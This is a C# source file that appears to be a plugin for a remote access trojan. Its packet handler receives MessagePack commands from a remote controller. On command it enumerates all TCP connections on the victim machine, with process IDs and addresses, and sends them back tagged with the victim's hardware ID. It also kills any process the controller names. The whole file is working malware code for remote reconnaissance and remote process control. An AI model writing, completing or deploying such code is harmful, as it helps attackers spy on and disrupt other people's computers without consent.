using MessagePackLib.MessagePack;
using Plugin.Handler;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
            {
                case "Netstat":
                    {
                        switch (unpack_msgpack.ForcePathObject("Option").AsString)
                        {
                            case "List":
                                {
                                    new HandleNetstat().NetstatList();
                                    break;
                                }

                            case "Kill":
                                {
                                    new HandleNetstat().Kill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                                    break;
                                }
                        }
                    }
                    break;
            }
        }
    }

    
    public class HandleNetstat
    {
        public void Kill(int ID)
        {
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    if (process.Id == ID)
                    {
                        process.Kill();
                    }
                }
                catch { };
            }
            NetstatList();
        }

        public void NetstatList()
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                TcpConnectionTableHelper.MIB_TCPROW_OWNER_PID[] tcpProgressInfoTable = TcpConnectionTableHelper.GetAllTcpConnections();



                int tableRowCount = tcpProgressInfoTable.Length;
                for (int i = 0; i < tableRowCount; i++)
                {
                    TcpConnectionTableHelper.MIB_TCPROW_OWNER_PID row = tcpProgressInfoTable[i];
                    string source = string.Format("{0}:{1}", TcpConnectionTableHelper.GetIpAddress(row.localAddr), row.LocalPort);
                    string dest = string.Format("{0}:{1}", TcpConnectionTableHelper.GetIpAddress(row.remoteAddr), row.RemotePort);
                    sb.Append(row.owningPid + "-=>" + source + "-=>" + dest + "-=>" + (TCP_CONNECTION_STATE)row.state + "-=>");
                }
                Debug.WriteLine(sb);
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "netstat";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Message").AsString = sb.ToString();
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch { }
        }

    }

}
